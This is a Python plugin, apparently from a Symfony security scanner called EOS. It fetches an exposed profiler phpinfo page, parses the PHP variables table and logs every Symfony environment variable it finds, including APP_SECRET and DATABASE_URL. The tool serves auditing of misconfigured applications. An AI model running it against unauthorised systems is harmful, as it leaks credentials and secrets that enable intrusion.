"""Phpinfo EOS plugin."""

from eos.plugins import AbstractPlugin


class Plugin(AbstractPlugin):
    """
    Phpinfo EOS plugin.

    Check for the phpinfo page and return its URL.
    """

    name = 'Phpinfo'

    def run(self):
        """
        Get phpinfo().

        Perform request to https://target.com/_profiler/phpinfo.
        Extract interesting variables from it, based on the content of $_ENV['SYMFONY_DOTENV_VARS'].
            <h2>PHP Variables</h2>
            <table>
                <tbody>
                    <tr class="h"><th>Variable</th><th>Value</th></tr>
                    <tr>
                        <td class="e">$_ENV['APP_ENV']</td>
                        <td class="v">dev</td>
                    </tr>
                    <tr>
                        <td class="e">$_ENV['SYMFONY_DOTENV_VARS']</td>
                        <td class="v">APP_ENV,APP_SECRET,DATABASE_URL,MAILER_URL</td>
                    </tr>
                    ...
        """

        r = self.symfony.profiler.get('phpinfo')
        if r.status_code == 404:
            self.log.error('Could not find phpinfo!')
            return

        self.log.info('Available at %s', r.url)
        soup = self.parse(r.text)
        try:
            title = soup.find('h2', string='PHP Variables')
            table = title.find_next('table')
            entries = table.find_all('tr')
            self.log.info('Found %d PHP variables', len(entries))
        except AttributeError:
            self.log.error('Could not find PHP variables')
            return

        phpinfo = {}
        for entry in entries[1:]:
            key = entry.find('td', class_='e').text
            value = entry.find('td', class_='v').text
            phpinfo[key] = value

        dotenv_vars = phpinfo.get("$_ENV['SYMFONY_DOTENV_VARS']")
        if not dotenv_vars:
            self.log.info('Did not find any Symfony variable')
            return

        dotenv_vars = dotenv_vars.split(',')
        self.log.warning('Found the following Symfony variables:')
        for var in dotenv_vars:
            value = phpinfo["$_ENV['{}']".format(var)]
            self.log.warning('  %s: %s', var, value)
